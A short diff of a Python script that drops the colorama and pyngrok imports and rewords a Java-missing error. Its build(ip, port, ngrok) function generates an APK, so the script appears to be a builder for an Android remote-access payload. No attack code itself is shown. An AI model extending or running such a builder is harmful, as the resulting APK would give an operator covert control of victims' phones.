@@ -11,12 +11,11 @@ import pathlib
 import platform
 import re
 from subprocess import PIPE, run
-from colorama import Fore, Style,init
-from pyngrok import ngrok
 import socket
 import threading
 import itertools
 import queue
+
 
 
 banner = """\033[1m\033[91m
@@ -52,7 +51,6 @@ def clearDirec():
     if(platform.system() == 'Windows'):
         clear = lambda: os.system('cls')
         direc = "\\"
-        init(convert=True)
     else:
         clear = lambda: os.system('clear')
         direc = "/"
@@ -369,7 +367,7 @@ def build(ip,port,output,ngrok=False,ng=None,icon=None):
         print(e)
         sys.exit()
     java_version = execute("java -version")
-    if java_version.returncode: print(stdOutput("error")+"Java Not Installed");exit()
+    if java_version.returncode: print(stdOutput("error")+"Java not installed or found");exit()
     #version_no = re.search(pattern, java_version.stderr).groups()[0]
     # if float(version_no) > 1.8: print(stdOutput("error")+"Java 8 is required, Java version found "+version_no);exit()
     print(stdOutput("info")+"\033[0mGenerating APK")
